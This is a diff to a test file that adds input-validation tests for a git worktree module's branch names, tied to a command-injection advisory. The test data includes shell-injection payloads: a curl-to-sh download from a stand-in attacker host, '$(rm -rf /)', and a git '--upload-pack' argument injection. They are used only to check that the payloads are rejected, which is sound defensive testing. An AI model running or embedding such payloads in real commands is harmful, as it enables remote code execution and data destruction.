@@ -5,8 +5,60 @@ vi.mock("./logger.js", () => ({
   logger: { warn: vi.fn(), info: vi.fn() },
 }));
 
-import { sanitizeBranch, worktreeDir, ensureWorktree, removeWorktree } from "./worktree.js";
+import {
+  sanitizeBranch,
+  worktreeDir,
+  ensureWorktree,
+  removeWorktree,
+  validateGitBranchName,
+} from "./worktree.js";
 import type { GitExecutor, WorktreeFileSystem } from "./worktree.js";
+
+describe("validateGitBranchName", () => {
+  it("accepts ordinary branch names", () => {
+    expect(() => validateGitBranchName("main")).not.toThrow();
+    expect(() => validateGitBranchName("feature/foo")).not.toThrow();
+    expect(() => validateGitBranchName("release-1.2.3")).not.toThrow();
+    expect(() => validateGitBranchName("nick-pape/149-agent_subtask")).not.toThrow();
+  });
+
+  it("rejects shell metacharacters (command injection — GHSA-vv65)", () => {
+    const payloads = [
+      "x;touch /tmp/PWNED",
+      "x;curl http://attacker/x.sh|sh;#",
+      "$(touch /tmp/pwned)",
+      "`id`",
+      "a|b",
+      "a&b",
+      "a>b",
+      "a b", // whitespace
+      "a$b",
+      "a'b",
+      'a"b',
+    ];
+    for (const p of payloads) {
+      expect(() => validateGitBranchName(p), p).toThrow(/Invalid branch name/);
+    }
+  });
+
+  it("rejects argument injection (leading dash — F13)", () => {
+    // All-allowlist-char inputs that start with '-' must hit the leading-dash rule.
+    expect(() => validateGitBranchName("-rf")).toThrow(/must not start with '-'/);
+    expect(() => validateGitBranchName("--force")).toThrow(/must not start with '-'/);
+    // A dash-led flag carrying disallowed chars is still rejected (by the charset rule).
+    expect(() => validateGitBranchName("--upload-pack=evil")).toThrow(/Invalid branch name/);
+  });
+
+  it("rejects git ref-rule violations", () => {
+    expect(() => validateGitBranchName("")).toThrow(/must not be empty/);
+    expect(() => validateGitBranchName("a..b")).toThrow(/must not contain '\.\.'/);
+    expect(() => validateGitBranchName("/leading")).toThrow(/must not start or end with '\/'/);
+    expect(() => validateGitBranchName("trailing/")).toThrow(/must not start or end with '\/'/);
+    expect(() => validateGitBranchName("x.lock")).toThrow(/must not end with '\.lock'/);
+    expect(() => validateGitBranchName("x.")).toThrow(/must not end with '\.'/);
+    expect(() => validateGitBranchName("a".repeat(256))).toThrow(/exceeds 255 characters/);
+  });
+});
 
 describe("sanitizeBranch", () => {
   it("preserves alphanumeric characters", () => {
@@ -167,6 +219,43 @@ describe("ensureWorktree", () => {
     expect(fetchCall).toBeUndefined();
   });
 
+  it("rejects a malicious branch name before invoking git (GHSA-vv65)", async () => {
+    const git = createFakeGitExecutor({
+      "rev-parse": { stdout: ".git" },
+      status: { stdout: "" },
+      fetch: { stdout: "" },
+      worktree: { stdout: "" },
+    });
+
+    await expect(
+      ensureWorktree("/repo", "x;touch /tmp/PWNED", git, createFakeFileSystem()),
+    ).rejects.toThrow(/Invalid branch name/);
+
+    // Nothing should have been handed to git — not even the rev-parse pre-check.
+    expect(git.calls).toHaveLength(0);
+  });
+
+  it("terminates options with -- before the positional worktree path", async () => {
+    const git = createFakeGitExecutor({
+      "rev-parse": { stdout: ".git" },
+      status: { stdout: "" },
+      fetch: { stdout: "" },
+      "symbolic-ref": { stdout: "refs/remotes/origin/main\n" },
+      worktree: { stdout: "" },
+    });
+
+    await ensureWorktree("/repo", "feature/sep", git, createFakeFileSystem());
+
+    const worktreeCall = git.calls.find((c) => c.args[0] === "worktree");
+    expect(worktreeCall).toBeDefined();
+    expect(worktreeCall!.args).toContain("--");
+    // "--" must come before the positional path so the path can't be read as a flag.
+    const sepIdx = worktreeCall!.args.indexOf("--");
+    const branchIdx = worktreeCall!.args.indexOf("feature/sep");
+    expect(branchIdx).toBeGreaterThanOrEqual(0);
+    expect(sepIdx).toBeGreaterThan(branchIdx);
+  });
+
   it("falls back to origin/main when symbolic-ref fails", async () => {
     const git = createFakeGitExecutor({
       "rev-parse": { stdout: ".git" },
@@ -202,9 +291,19 @@ describe("removeWorktree", () => {
     expect(call.args[0]).toBe("worktree");
     expect(call.args[1]).toBe("remove");
     expect(call.args).toContain("--force");
+    expect(call.args).toContain("--");
     expect(call.cwd).toBe("/repo");
-    // The worktree path should contain the sanitized branch name
-    expect(call.args[2]).toContain("feature-done");
+    // The worktree path is the final arg (after the "--" option terminator) and
+    // should contain the sanitized branch name.
+    expect(call.args[call.args.length - 1]).toContain("feature-done");
+  });
+
+  it("rejects a malicious branch name before invoking git", async () => {
+    const git = createFakeGitExecutor({ worktree: { stdout: "" } });
+    await expect(removeWorktree("/repo", "$(rm -rf /)", git)).rejects.toThrow(
+      /Invalid branch name/,
+    );
+    expect(git.calls).toHaveLength(0);
   });
 
   it("does not throw when git worktree remove fails", async () => {
